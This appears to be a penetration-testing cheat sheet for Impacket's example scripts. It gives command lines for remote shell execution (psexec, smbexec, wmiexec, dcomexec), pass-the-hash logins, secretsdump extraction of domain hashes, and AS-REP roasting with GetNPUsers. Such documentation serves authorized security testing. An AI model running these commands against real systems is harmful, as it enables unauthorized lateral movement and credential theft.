# Impacket

Collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols \(e.g. SMB1-3 and MSRPC\) the protocol implementation itself.

#### Install:

```bash
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
python3 setup.py install
```

Once you have it installed the python scripts are located in this path:

```text
/usr/share/doc/python3-impacket/examples/
```

### dcomexec.py

Dcomexec.py method uses various DCOM endpoints such as MMC20.Application, ShellWindows or ShellBrowserWindow objects to spawn a semi-interactive shell on the remote system.

```bash
#Using user:password
python3 dcomexec.py "./Administrator:pass123"@10.10.10.19

#Using NTLM hash
python3 dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@10.10.10.19
```

### GetNPUsers.py

List and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set \(UF\_DONT\_REQUIRE\_PREAUTH\). Output is compatible with JtR.

```bash
#Given username list or query to obtain a list of users by providing domain credentials
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
```

### lookupsid.py

A Windows SID brute forcer example through \[MS-LSAT\] MSRPC Interface, aiming at finding remote users/groups.

```bash
#Using user:password
python3 lookupsid.py fox.local/Administrator:pass123@10.10.10.19
```

### psexec.py

This method is very similar to the traditional PsExec from SysInternals. In this case, however, Impacket uses RemComSvc utility.

```bash
#Using user:password
python3 psexec.py "./Administrator:pass123"@10.10.10.19

#Using NTLM hash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@10.10.10.19
```

### samrdump.py

Samrdump is an application that retrieves sensitive information about the specified target machine using the Security Account Manager \(SAM\).

```bash
#Using user:password
python3 samrdump.py fox.local/Administrator:pass123@10.10.10.19
```

### secretsdump.py

Performs various techniques to dump secrets from the remote machine without executing any agent there.

```bash
#Extract password hashes using ntds.dit & system files
python3 secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```

### smbclient.py

A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination.

```bash
#Using user:password
python3 smbclient.py fox.local/Administrator:pass123@10.10.10.19
```

### smbexec.py

Smbexec.py method takes advantage of the native Windows SMB functionality to execute arbitrary commands on the remote system.

```bash
#Using user:password
python3 smbexec.py "./Administrator:pass123"@10.10.10.19

#Using NTLM hash
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@10.10.10.19
```

### smbserver.py

A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.

```bash
#EVILSHARE = share-name; /tmp/evilshare = root-dir
python3 smbserver.py EVILSHARE /tmp/evilshare
```

### wmiexec.py

Wmiexec.py method is used to silently execute commands against a compromised endpoint using WMI.

```bash
#Using user:password
python3 wmiexec.py "./Administrator:pass123"@10.10.10.19

#Using NTLM hash
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d
```

{% embed url="https://github.com/SecureAuthCorp/impacket" %}

